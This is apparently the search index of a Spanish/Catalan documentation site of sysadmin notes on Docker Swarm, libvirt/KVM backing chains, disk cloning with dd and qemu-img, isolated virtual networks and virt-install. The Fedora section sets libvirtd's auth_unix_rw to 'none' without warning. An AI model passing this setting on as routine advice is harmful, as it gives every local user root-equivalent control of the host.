leave Node left the swarm. # quitar manager y parar swarm \u279c docker swarm leave --force","title":"Labels"},{"location":"virtualizacion/swarm/#puertos","text":"Obrir ports en el worker: \u25cf 80 \u25cf 8080 \u25cf 9000 \u25cf 2377 per gestio de nodes \u25cf Port 7946 UDP for container network discovery. \u25cf Port 7946 TCP for container network discovery. \u25cf Port 4789 UDP for the container ingress network. Obrir ports en manager: \u25cf Port 7946 UDP for container network discovery. \u25cf Port 7946 TCP for container network discovery. \u25cf Port 4789 UDP for the container ingress network.","title":"puertos"},{"location":"virtualizacion/swarm/#modo-global","text":"El modo global es un modo en el que se har\u00e1 un despliegue de un contenedor en cada nodo, si hay 3 nodos se crear\u00e1n tres replicas. version : \"3.7\" services : worker : image : dockersamples/examplevotingapp_worker deploy : mode : global","title":"Modo global"},{"location":"virtualizacion/virt-manager/Backing_chain/","text":"Backing_chain Backing chain permite crear una m\u00e1quina virtual r\u00e1pidamente. Es tan r\u00e1pido por que realmente no la crea, se basa en una m\u00e1quina base y le va a\u00f1adiendo seciones al disco nuevo. Si la m\u00e1quina base se actualiza la nueva tambi\u00e9n estara actualizada al arrancarse de nuevo. El inconveniente es que si desaparece la m\u00e1quina base se tendran que reescribir de donde cogen base todas las backing creadas. Script backing Este script creara una m\u00e1quina de la base que eligas. #!/bin/bash # este script creara una carpeta backing dentro de /var/lib/libvirt/images/ echo \"Aquest script solament funcionara amb els disc guardats a /var/lib/libvirt/images/*\" virsh list --all # demanem nom de maquina a extreure .xml read -e -p \"Introdueix el nom de la m\u00e1quina que vols la base: \" XML_MV #Demanem el nom de la m\u00e0quina virtual nova read -e -p \"Introdueix el nom de la nova MV: \" NOM_MV echo \"\" #Creem un nou arxiu xml a partir de la plantilla virsh dumpxml $XML_MV > $NOM_MV .xml # extreiem nom del disc virtual de base disc_base = ` cat $NOM_MV .xml | egrep \"<source file\" | sed -r 's,^.*images/(.*\\.qcow2).*,\\1,' ` #Modifiquem el xml de la nova MV: nom. sed -i -e s, \"<name>.*</name>\" , \"<name> $NOM_MV </name>\" , $NOM_MV .xml # Borrem uuid sed -i -e s, \"<uuid>.*</uuid>\" , \"\" , $NOM_MV .xml # eliminem mac sed -i -e s, \"<mac address=.*/>\" , \"\" , $NOM_MV .xml # cambiem nom disc sed -i -e s, \"<source file='/var/lib/libvirt/images/.*.qcow2'/>\" , \"<source file='/var/lib/libvirt/images/backing/ $NOM_MV .qcow2'/>\" , $NOM_MV .xml #si no existeix, creem carpeta per guardar discs de backing if ! [ -d /var/lib/libvirt/images/backing ] ; then mkdir /var/lib/libvirt/images/backing fi # creem disc nou baat a la m\u00e1quina base qemu-img create -b /var/lib/libvirt/images/ $disc_base -f qcow2 /var/lib/libvirt/images/backing/ $NOM_MV .qcow2 #Creem la MV amb el nou xml virsh define $NOM_MV .xml #info del nou disc echo \"\" echo \"Informaci\u00f3 del seu nou disc\" echo \"\" qemu-img info --backing-chain /var/lib/libvirt/images/backing/ $NOM_MV .qcow2 # borra archivo .xml rm $NOM_MV .xml","title":"Backing_chain"},{"location":"virtualizacion/virt-manager/Backing_chain/#backing_chain","text":"Backing chain permite crear una m\u00e1quina virtual r\u00e1pidamente. Es tan r\u00e1pido por que realmente no la crea, se basa en una m\u00e1quina base y le va a\u00f1adiendo seciones al disco nuevo. Si la m\u00e1quina base se actualiza la nueva tambi\u00e9n estara actualizada al arrancarse de nuevo. El inconveniente es que si desaparece la m\u00e1quina base se tendran que reescribir de donde cogen base todas las backing creadas.","title":"Backing_chain"},{"location":"virtualizacion/virt-manager/Backing_chain/#script-backing","text":"Este script creara una m\u00e1quina de la base que eligas. #!/bin/bash # este script creara una carpeta backing dentro de /var/lib/libvirt/images/ echo \"Aquest script solament funcionara amb els disc guardats a /var/lib/libvirt/images/*\" virsh list --all # demanem nom de maquina a extreure .xml read -e -p \"Introdueix el nom de la m\u00e1quina que vols la base: \" XML_MV #Demanem el nom de la m\u00e0quina virtual nova read -e -p \"Introdueix el nom de la nova MV: \" NOM_MV echo \"\" #Creem un nou arxiu xml a partir de la plantilla virsh dumpxml $XML_MV > $NOM_MV .xml # extreiem nom del disc virtual de base disc_base = ` cat $NOM_MV .xml | egrep \"<source file\" | sed -r 's,^.*images/(.*\\.qcow2).*,\\1,' ` #Modifiquem el xml de la nova MV: nom. sed -i -e s, \"<name>.*</name>\" , \"<name> $NOM_MV </name>\" , $NOM_MV .xml # Borrem uuid sed -i -e s, \"<uuid>.*</uuid>\" , \"\" , $NOM_MV .xml # eliminem mac sed -i -e s, \"<mac address=.*/>\" , \"\" , $NOM_MV .xml # cambiem nom disc sed -i -e s, \"<source file='/var/lib/libvirt/images/.*.qcow2'/>\" , \"<source file='/var/lib/libvirt/images/backing/ $NOM_MV .qcow2'/>\" , $NOM_MV .xml #si no existeix, creem carpeta per guardar discs de backing if ! [ -d /var/lib/libvirt/images/backing ] ; then mkdir /var/lib/libvirt/images/backing fi # creem disc nou baat a la m\u00e1quina base qemu-img create -b /var/lib/libvirt/images/ $disc_base -f qcow2 /var/lib/libvirt/images/backing/ $NOM_MV .qcow2 #Creem la MV amb el nou xml virsh define $NOM_MV .xml #info del nou disc echo \"\" echo \"Informaci\u00f3 del seu nou disc\" echo \"\" qemu-img info --backing-chain /var/lib/libvirt/images/backing/ $NOM_MV .qcow2 # borra archivo .xml rm $NOM_MV .xml","title":"Script backing"},{"location":"virtualizacion/virt-manager/Clonar/","text":"Clonar de virtual a f\u00edsico y de f\u00edsico a virtual. Virtual a f\u00edsico clonar disco virtual autom\u00e1ticamente kvm sudo virt-clone -o antergos --auto-clone Asignando 'antergos-clone.qcow2' | 20 GB 03 :22 preparar disco clonado para ejecutarse Virt-sysprep elimina mac y uuid especificas para que no coincida 2 veces y den problemas al arrancar la maquina clonada. sudo virt-sysprep -a /var/lib/libvirt/images/antergos-clone.qcow2 [ 0 ,0 ] Examining the guest ... [ 7 ,7 ] Performing \"abrt-data\" ... --- --- [ 8 ,1 ] Setting a random seed [ 8 ,4 ] Performing \"lvm-uuids\" ... clonar imagen del clon a partici\u00f3n /dev/sda12 sudo qemu-img convert -f qcow2 -O raw /var/lib/libvirt/images/antergos-clone.qcow2 /dev/sda12 abriendo partici\u00f3n /sda12 con kvm sudo kvm /dev/sda12 -m 1G F\u00edsico a virtual clonar particion /dev/sda12 a imagen .raw sudo dd if = /dev/sda12 | pv | dd of = /home/debian/Descargas/and-4-3.raw 5 ,72GiB 0 :03:32 26 ,7MiB/s 15360000 +0 registros le\u00eddos 15360000 +0 registros escritos 7864320000 bytes ( 7 ,9 GB, 7 ,3 GiB ) copied, 272 ,937 s, 28 ,8 MB/s convertir imagen .raw a .qcow2 sudo qemu-img convert -f raw -O qcow2 and-4-3.raw and-4-3.qcow2 mover a libreria de virt-manager sudo mv and-4-3.qcow2 /var/lib/libvirt/images/and-4-3.qcow2 preparar disco clonado para ejecutarse sudo virt-sysprep -a /var/lib/libvirt/images/and-4-3.qcow2 Comprobar comprobar que funciona, hay que crear una m\u00e1quina y escoger la iso .qcow2 de la librer\u00eda Virtual a virtual De .qcow2 a .qcow2 clonar disco virtual autom\u00e1ticamente kvm sudo virt-clone -o antergos --auto-clone Asignando 'antergos-clone.qcow2' | 20 GB 03 :22 preparar disco clonado para ejecutarse sudo virt-sysprep -a /var/lib/libvirt/images/antergos-clone.qcow2 abrir desde virt-manager De .qcow2 a .vmdk sudo qemu-img convert -f qcow2 -O vmdk imagen_origen.qcow2 imagen_destino.vmdk preparar disco clonado para ejecutarse sudo virt-sysprep -a /home/debian/Descargas/antergos.vmdk De .qcow2 a .vdi sudo qemu-img convert -f qcow2 <qcow2_VM_filename> -O vdi <RAW_file_VM_filename> preparar disco clonado para ejecutarse sudo virt-sysprep -a /home/debian/Descargas/antergos.vdi","title":"Clonar de virtual a f\u00edsico y de f\u00edsico a virtual."},{"location":"virtualizacion/virt-manager/Clonar/#clonar-de-virtual-a-fisico-y-de-fisico-a-virtual","text":"","title":"Clonar de virtual a f\u00edsico y de f\u00edsico a virtual."},{"location":"virtualizacion/virt-manager/Clonar/#virtual-a-fisico","text":"","title":"Virtual a f\u00edsico"},{"location":"virtualizacion/virt-manager/Clonar/#clonar-disco-virtual-automaticamente-kvm","text":"sudo virt-clone -o antergos --auto-clone Asignando 'antergos-clone.qcow2' | 20 GB 03 :22","title":"clonar disco virtual autom\u00e1ticamente kvm"},{"location":"virtualizacion/virt-manager/Clonar/#preparar-disco-clonado-para-ejecutarse","text":"Virt-sysprep elimina mac y uuid especificas para que no coincida 2 veces y den problemas al arrancar la maquina clonada. sudo virt-sysprep -a /var/lib/libvirt/images/antergos-clone.qcow2 [ 0 ,0 ] Examining the guest ... [ 7 ,7 ] Performing \"abrt-data\" ... --- --- [ 8 ,1 ] Setting a random seed [ 8 ,4 ] Performing \"lvm-uuids\" ...","title":"preparar disco clonado para ejecutarse"},{"location":"virtualizacion/virt-manager/Clonar/#clonar-imagen-del-clon-a-particion-devsda12","text":"sudo qemu-img convert -f qcow2 -O raw /var/lib/libvirt/images/antergos-clone.qcow2 /dev/sda12","title":"clonar imagen del clon a partici\u00f3n /dev/sda12"},{"location":"virtualizacion/virt-manager/Clonar/#abriendo-particion-sda12-con-kvm","text":"sudo kvm /dev/sda12 -m 1G","title":"abriendo partici\u00f3n /sda12 con kvm"},{"location":"virtualizacion/virt-manager/Clonar/#fisico-a-virtual","text":"","title":"F\u00edsico a virtual"},{"location":"virtualizacion/virt-manager/Clonar/#clonar-particion-devsda12-a-imagen-raw","text":"sudo dd if = /dev/sda12 | pv | dd of = /home/debian/Descargas/and-4-3.raw 5 ,72GiB 0 :03:32 26 ,7MiB/s 15360000 +0 registros le\u00eddos 15360000 +0 registros escritos 7864320000 bytes ( 7 ,9 GB, 7 ,3 GiB ) copied, 272 ,937 s, 28 ,8 MB/s","title":"clonar particion /dev/sda12 a imagen .raw"},{"location":"virtualizacion/virt-manager/Clonar/#convertir-imagen-raw-a-qcow2","text":"sudo qemu-img convert -f raw -O qcow2 and-4-3.raw and-4-3.qcow2","title":"convertir imagen .raw a .qcow2"},{"location":"virtualizacion/virt-manager/Clonar/#mover-a-libreria-de-virt-manager","text":"sudo mv and-4-3.qcow2 /var/lib/libvirt/images/and-4-3.qcow2","title":"mover a libreria de virt-manager"},{"location":"virtualizacion/virt-manager/Clonar/#preparar-disco-clonado-para-ejecutarse_1","text":"sudo virt-sysprep -a /var/lib/libvirt/images/and-4-3.qcow2","title":"preparar disco clonado para ejecutarse"},{"location":"virtualizacion/virt-manager/Clonar/#comprobar","text":"comprobar que funciona, hay que crear una m\u00e1quina y escoger la iso .qcow2 de la librer\u00eda","title":"Comprobar"},{"location":"virtualizacion/virt-manager/Clonar/#virtual-a-virtual","text":"","title":"Virtual a virtual"},{"location":"virtualizacion/virt-manager/Clonar/#de-qcow2-a-qcow2","text":"","title":"De .qcow2 a .qcow2"},{"location":"virtualizacion/virt-manager/Clonar/#clonar-disco-virtual-automaticamente-kvm_1","text":"sudo virt-clone -o antergos --auto-clone Asignando 'antergos-clone.qcow2' | 20 GB 03 :22","title":"clonar disco virtual autom\u00e1ticamente kvm"},{"location":"virtualizacion/virt-manager/Clonar/#preparar-disco-clonado-para-ejecutarse_2","text":"sudo virt-sysprep -a /var/lib/libvirt/images/antergos-clone.qcow2 abrir desde virt-manager","title":"preparar disco clonado para ejecutarse"},{"location":"virtualizacion/virt-manager/Clonar/#de-qcow2-a-vmdk","text":"sudo qemu-img convert -f qcow2 -O vmdk imagen_origen.qcow2 imagen_destino.vmdk","title":"De .qcow2 a .vmdk"},{"location":"virtualizacion/virt-manager/Clonar/#preparar-disco-clonado-para-ejecutarse_3","text":"sudo virt-sysprep -a /home/debian/Descargas/antergos.vmdk","title":"preparar disco clonado para ejecutarse"},{"location":"virtualizacion/virt-manager/Clonar/#de-qcow2-a-vdi","text":"sudo qemu-img convert -f qcow2 <qcow2_VM_filename> -O vdi <RAW_file_VM_filename>","title":"De .qcow2 a .vdi"},{"location":"virtualizacion/virt-manager/Clonar/#preparar-disco-clonado-para-ejecutarse_4","text":"sudo virt-sysprep -a /home/debian/Descargas/antergos.vdi","title":"preparar disco clonado para ejecutarse"},{"location":"virtualizacion/virt-manager/Instalacion_de_virtualizacion_fedora/","text":"Instalaci\u00f3n de virtualizaci\u00f3n fedora Comprobar si nuestra cpu es intel VT-x o amd AMD-V y tiene el paquete de virtualizaci\u00f3n. egrep '(vmx|svm)' --color = always /proc/cpuinfo lscpu Sino habilitar desde la bios. Comprobar si esta el modulo de kvm cargado. lsmod | grep kvm Mirar los bits de nuestra m\u00e1quina mejor si son 64 uname -m Comprobar sistema operativo y versi\u00f3n ( extra no es necesario ) Versi\u00f3: cat /etc/redhat-release Fedora release 24 (Twenty Four) Versi\u00f3: uname -r 4.6.7-300.fc24.x86_64 Instalar paquete de virtualizaci\u00f3n sudo dnf group install --with-optional virtualization ver paquetes binarios instalados rpm -qa | grep -E \"kvm|virt\" Iniciar el servicio de virtualizaci\u00f3n libvirt sudo systemctl start libvirtd.service sudo systemctl enable libvirtd.service Iniciar virt-manager com usuario no root Con la configuraci\u00f3n inicial s\u00f3lo puede usar los servicios root, la cambiamos para dar permisos a cualquiera. vim /etc/libvirt/libvirtd.conf \u2014> auth_unix_rw = \"none\" Reiniciar el dominio de m\u00e1quinas virtuales para guardar configuraci\u00f3n. sudo systemctl restart libvirtd.service Ya podemos usar los paquetes, por ejemplo abrir particiones reales virtualizadas. sudo qemu-kvm /dev/sda","title":"Instalaci\u00f3n de virtualizaci\u00f3n fedora"},{"location":"virtualizacion/virt-manager/Instalacion_de_virtualizacion_fedora/#instalacion-de-virtualizacion-fedora","text":"Comprobar si nuestra cpu es intel VT-x o amd AMD-V y tiene el paquete de virtualizaci\u00f3n. egrep '(vmx|svm)' --color = always /proc/cpuinfo lscpu Sino habilitar desde la bios. Comprobar si esta el modulo de kvm cargado. lsmod | grep kvm Mirar los bits de nuestra m\u00e1quina mejor si son 64 uname -m Comprobar sistema operativo y versi\u00f3n ( extra no es necesario ) Versi\u00f3: cat /etc/redhat-release Fedora release 24 (Twenty Four) Versi\u00f3: uname -r 4.6.7-300.fc24.x86_64 Instalar paquete de virtualizaci\u00f3n sudo dnf group install --with-optional virtualization ver paquetes binarios instalados rpm -qa | grep -E \"kvm|virt\" Iniciar el servicio de virtualizaci\u00f3n libvirt sudo systemctl start libvirtd.service sudo systemctl enable libvirtd.service Iniciar virt-manager com usuario no root Con la configuraci\u00f3n inicial s\u00f3lo puede usar los servicios root, la cambiamos para dar permisos a cualquiera. vim /etc/libvirt/libvirtd.conf \u2014> auth_unix_rw = \"none\" Reiniciar el dominio de m\u00e1quinas virtuales para guardar configuraci\u00f3n. sudo systemctl restart libvirtd.service Ya podemos usar los paquetes, por ejemplo abrir particiones reales virtualizadas. sudo qemu-kvm /dev/sda","title":"Instalaci\u00f3n de virtualizaci\u00f3n fedora"},{"location":"virtualizacion/virt-manager/acceder_consola_desde_virsh/","text":"acceder consola desde virsh https://www.certdepot.net/rhel7-access-virtual-machines-console/ Entrar en la m\u00e1quina virtual y ejecutar el siguiente comando. sudo grubby --update-kernel = ALL --args = \"console=ttyS0\" Alternativa si no funciona. Note: Alternatively, you can edit the /etc/default/grub file, add \u2018console=ttyS0\u2018 to the GRUB_CMDLINE_LINUX variable and execute: sudo grub2-mkconfig -o /boot/grub2/grub.cfg Now, reboot the virtual machine: sudo reboot sudo virsh console f24 Connected to domain f24 Escape character is ^ ] Fedora 24 ( Workstation Edition ) Kernel 4 .5.5-300.fc24.x86_64 on an x86_64 ( ttyS0 )","title":"acceder consola desde virsh"},{"location":"virtualizacion/virt-manager/acceder_consola_desde_virsh/#acceder-consola-desde-virsh","text":"https://www.certdepot.net/rhel7-access-virtual-machines-console/ Entrar en la m\u00e1quina virtual y ejecutar el siguiente comando. sudo grubby --update-kernel = ALL --args = \"console=ttyS0\" Alternativa si no funciona. Note: Alternatively, you can edit the /etc/default/grub file, add \u2018console=ttyS0\u2018 to the GRUB_CMDLINE_LINUX variable and execute: sudo grub2-mkconfig -o /boot/grub2/grub.cfg Now, reboot the virtual machine: sudo reboot sudo virsh console f24 Connected to domain f24 Escape character is ^ ] Fedora 24 ( Workstation Edition ) Kernel 4 .5.5-300.fc24.x86_64 on an x86_64 ( ttyS0 )","title":"acceder consola desde virsh"},{"location":"virtualizacion/virt-manager/crear_red_aislada/","text":"Crear red aislada creo isolated forma gr\u00e1fica crear red aislada virt-manager \u2192 editar \u2192 detalles de conexi\u00f3n \u2192 redes virtuales \u2192 add: desmarcar todas las casillas y dejar solo marcada red virtual aislada, todo lo dem\u00e1s en blanco. asignar red aislada a una m\u00e1quina seleccionar maquina \u2192 abrir \u2192 bombilla de configuraci\u00f3n \u2192 NIC ( red ) : fuente de red : elegir red virtual aislada isolated modelo de dispositivo : a de ser virtio al ser una red virtual. creo isolated2 desde comando crear archivo isolated2.xml nano isolated2.xml <network> <name>isolated2</name> </network> definir la red sudo virsh net-define isolated2.xml Network isolated2 defined from isolated2.xml net-create crea una red igual que net-define la diferencia es que create se elimina al dejar de usarla y define es persistente. ver lista de redes desde virsh sudo virsh net-list --all Name State Autostart Persistent ---------------------------------------------------------- default inactive no yes isolated active yes yes isolated2 inactive no yes ver archivo de configuraci\u00f3n de la red sudo virsh net-dumpxml isolated2 <network> <name>isolated2</name> <uuid>012e5b7f-ad0e-4047-8503-565fa377cc77</uuid> <bridge name = 'virbr2' stp = 'on' delay = '0' /> <mac address = '52:54:00:ca:45:01' /> </network> name: nombre uuid:identificador mac: mac bridge. par\u00e1metros del bridge los archivos .xml de red se guardan en: sudo ls /etc/libvirt/qemu/networks/ autostart default.xml isolated2.xml isolated.xml Activamos y comprobamos isolated2 sudo virsh net-start isolated2Network isolated2 started Network isolated2 started sudo virsh net-list --all Name State Autostart Persistent ---------------------------------------------------------- default inactive no yes isolated active yes yes isolated2 active no yes ver tarjeta de red de una m\u00e1quina en mi caso f24 sudo virsh domiflist f24 Interface Type Source Model MAC ------------------------------------------------------- - direct enp3s0 virtio 52 :54:00:a4:fd:86 asignar tarjeta de red a una m\u00e1quina. sudo virsh start f24 Domain f24 started sudo virsh attach-interface --domain f24 --source isolated2 --type network --model virtio --config --live Interface attached successfully --config es para que sea permanente --live si la m\u00e1quina est\u00e1 activa, en el caso que estuviera apagada ignorarlo sudo virsh domiflist f24Interface Type Source Model MAC ------------------------------------------------------- macvtap0 direct enp3s0 virtio 52 :54:00:a4:fd:86 vnet0 network isolated2 virtio 52 :54:00:80:b9:b4 ver puente entre redes. deducimos el nombre del bridge en el net-dumpxml anterior. sudo brctl show virbr2 bridge name bridge id STP enabled interfaces virbr2 8000 .525400ca4501 yes virbr2-nic vnet0 quitar red virtual de la m\u00e1quina. sudo virsh detach-interface --domain f24 --type network --config --live --mac 52 :54:00:80:b9:b4 Interface detached successfully sudo virsh domiflist f24 Interface Type Source Model MAC ------------------------------------------------------- macvtap0 direct enp3s0 virtio 52 :54:00:a4:fd:86","title":"Crear red aislada"},{"location":"virtualizacion/virt-manager/crear_red_aislada/#crear-red-aislada","text":"","title":"Crear red aislada"},{"location":"virtualizacion/virt-manager/crear_red_aislada/#creo-isolated-forma-grafica","text":"crear red aislada virt-manager \u2192 editar \u2192 detalles de conexi\u00f3n \u2192 redes virtuales \u2192 add: desmarcar todas las casillas y dejar solo marcada red virtual aislada, todo lo dem\u00e1s en blanco. asignar red aislada a una m\u00e1quina seleccionar maquina \u2192 abrir \u2192 bombilla de configuraci\u00f3n \u2192 NIC ( red ) : fuente de red : elegir red virtual aislada isolated modelo de dispositivo : a de ser virtio al ser una red virtual.","title":"creo isolated forma gr\u00e1fica"},{"location":"virtualizacion/virt-manager/crear_red_aislada/#creo-isolated2-desde-comando","text":"","title":"creo isolated2 desde comando"},{"location":"virtualizacion/virt-manager/crear_red_aislada/#crear-archivo-isolated2xml","text":"nano isolated2.xml <network> <name>isolated2</name> </network>","title":"crear archivo isolated2.xml"},{"location":"virtualizacion/virt-manager/crear_red_aislada/#definir-la-red","text":"sudo virsh net-define isolated2.xml Network isolated2 defined from isolated2.xml net-create crea una red igual que net-define la diferencia es que create se elimina al dejar de usarla y define es persistente.","title":"definir la red"},{"location":"virtualizacion/virt-manager/crear_red_aislada/#ver-lista-de-redes-desde-virsh","text":"sudo virsh net-list --all Name State Autostart Persistent ---------------------------------------------------------- default inactive no yes isolated active yes yes isolated2 inactive no yes","title":"ver lista de redes desde virsh"},{"location":"virtualizacion/virt-manager/crear_red_aislada/#ver-archivo-de-configuracion-de-la-red","text":"sudo virsh net-dumpxml isolated2 <network> <name>isolated2</name> <uuid>012e5b7f-ad0e-4047-8503-565fa377cc77</uuid> <bridge name = 'virbr2' stp = 'on' delay = '0' /> <mac address = '52:54:00:ca:45:01' /> </network> name: nombre uuid:identificador mac: mac bridge. par\u00e1metros del bridge","title":"ver archivo de configuraci\u00f3n de la red"},{"location":"virtualizacion/virt-manager/crear_red_aislada/#los-archivos-xml-de-red-se-guardan-en","text":"sudo ls /etc/libvirt/qemu/networks/ autostart default.xml isolated2.xml isolated.xml","title":"los archivos .xml de red se guardan en:"},{"location":"virtualizacion/virt-manager/crear_red_aislada/#activamos-y-comprobamos-isolated2","text":"sudo virsh net-start isolated2Network isolated2 started Network isolated2 started sudo virsh net-list --all Name State Autostart Persistent ---------------------------------------------------------- default inactive no yes isolated active yes yes isolated2 active no yes","title":"Activamos y comprobamos isolated2"},{"location":"virtualizacion/virt-manager/crear_red_aislada/#ver-tarjeta-de-red-de-una-maquina-en-mi-caso-f24","text":"sudo virsh domiflist f24 Interface Type Source Model MAC ------------------------------------------------------- - direct enp3s0 virtio 52 :54:00:a4:fd:86","title":"ver tarjeta de red de una m\u00e1quina en mi caso f24"},{"location":"virtualizacion/virt-manager/crear_red_aislada/#asignar-tarjeta-de-red-a-una-maquina","text":"sudo virsh start f24 Domain f24 started sudo virsh attach-interface --domain f24 --source isolated2 --type network --model virtio --config --live Interface attached successfully --config es para que sea permanente --live si la m\u00e1quina est\u00e1 activa, en el caso que estuviera apagada ignorarlo sudo virsh domiflist f24Interface Type Source Model MAC ------------------------------------------------------- macvtap0 direct enp3s0 virtio 52 :54:00:a4:fd:86 vnet0 network isolated2 virtio 52 :54:00:80:b9:b4","title":"asignar tarjeta de red a una m\u00e1quina."},{"location":"virtualizacion/virt-manager/crear_red_aislada/#ver-puente-entre-redes","text":"deducimos el nombre del bridge en el net-dumpxml anterior. sudo brctl show virbr2 bridge name bridge id STP enabled interfaces virbr2 8000 .525400ca4501 yes virbr2-nic vnet0","title":"ver puente entre redes."},{"location":"virtualizacion/virt-manager/crear_red_aislada/#quitar-red-virtual-de-la-maquina","text":"sudo virsh detach-interface --domain f24 --type network --config --live --mac 52 :54:00:80:b9:b4 Interface detached successfully sudo virsh domiflist f24 Interface Type Source Model MAC ------------------------------------------------------- macvtap0 direct enp3s0 virtio 52 :54:00:a4:fd:86","title":"quitar red virtual de la m\u00e1quina."},{"location":"virtualizacion/virt-manager/instalar_maquina_virtual_virt-install/","text":"virt Virt-builder Una manera r\u00e1pida de crear discos de m\u00e1quinas virtuales es con virt-builder , esta se descarga una plantilla y la customiza y crea un nueva m\u00e1quina. VM disponibles. virt-builder --list Por defecto la plantilla se descara en ~/.cache/virt-builder/ y los discos se generan como .img . En el ejemplo muestro como genero un disco con ubuntu, en formato qcow2, pasword de root jupiter, escritorio xfce4, y actualizo. virt-builder ubuntu-18.04 \\ --root-password password:jupiter \\ --format qcow2 -o /home/vms/ubuntu18.qcow2 \\ --hostname ubuntuvm \\ --update \\ --install \"xfce4\" \\ --network Esto genera el disco solo queda asignarlo a una m\u00e1quina virtual. Virt-install virt-install sirve para generar maquinas virtuales. generar desde disco existente. virt-install --name ubuntu-18.04 \\ --memory 2048 \\ --vcpus 1 \\ --import \\ --disk path = /home/vms/ubuntu-18.04.qcow2,format = qcow2 \\ --os-type = linux \\ --os-variant ubuntu-18.04 \\ --graphics none generar con iso de instalaci\u00f3n. virt-install \\ --name guest1-rhel7 \\ --memory 2048 \\ --vcpus 2 \\ --disk size = 8 \\ --cdrom /path/to/rhel7.iso \\ --os-variant rhel7 Gestionar M\u00e1quinas virsh shutdown archlinux # apagar virsh destroy archlinux # forzar apagado virsh reboot archlinux # reiniciar virsh suspend archlinux # suspender virsh resume archlinux # despertar de suspensi\u00f3n virsh save archlinux archivo_hibernacion # hibernar virsh restore archivo_hibernacion # desperta de hibernacion virsh domstate archlinux # estado de maquina virsh dominfo archlinux # informacion de una maquina virsh undefine archlinux # eliminar maquina virsh undefine archlinux --remove-all-storage # eliminar maquina y disco","title":"virt"},{"location":"virtualizacion/virt-manager/instalar_maquina_virtual_virt-install/#virt","text":"","title":"virt"},{"location":"virtualizacion/virt-manager/instalar_maquina_virtual_virt-install/#virt-builder","text":"Una manera r\u00e1pida de crear discos de m\u00e1quinas virtuales es con virt-builder , esta se descarga una plantilla y la customiza y crea un nueva m\u00e1quina. VM disponibles. virt-builder --list Por defecto la plantilla se descara en ~/.cache/virt-builder/ y los discos se generan como .img . En el ejemplo muestro como genero un disco con ubuntu, en formato qcow2, pasword de root jupiter, escritorio xfce4, y actualizo. virt-builder ubuntu-18.04 \\ --root-password password:jupiter \\ --format qcow2 -o /home/vms/ubuntu18.qcow2 \\ --hostname ubuntuvm \\ --update \\ --install \"xfce4\" \\ --network Esto genera el disco solo queda asignarlo a una m\u00e1quina virtual.","title":"Virt-builder"},{"location":"virtualizacion/virt-manager/instalar_maquina_virtual_virt-install/#virt-install","text":"virt-install sirve para generar maquinas virtuales. generar desde disco existente. virt-install --name ubuntu-18.04 \\ --memory 2048 \\ --vcpus 1 \\ --import \\ --disk path = /home/vms/ubuntu-18.04.qcow2,format = qcow2 \\ --os-type = linux \\ --os-variant ubuntu-18.04 \\ --graphics none generar con iso de instalaci\u00f3n. virt-install \\ --name guest1-rhel7 \\ --memory 2048 \\ --vcpus 2 \\ --disk size = 8 \\ --cdrom /path/to/rhel7.iso \\ --os-variant rhel7","title":"Virt-install"},{"location":"virtualizacion/virt-manager/instalar_maquina_virtual_virt-install/#gestionar-maquinas","text":"virsh shutdown archlinux # apagar virsh destroy archlinux # forzar apagado virsh reboot archlinux # reiniciar virsh suspend archlinux # suspender virsh resume archlinux # despertar de suspensi\u00f3n virsh save archlinux archivo_hibernacion # hibernar virsh restore archivo_hibernacion # desperta de hibernacion virsh domstate archlinux # estado de maquina virsh dominfo archlinux # informacion de una maquina virsh undefine archlinux # eliminar maquina virsh undefine archlinux --remove-all-storage # eliminar maquina y disco","title":"Gestionar M\u00e1quinas"}]}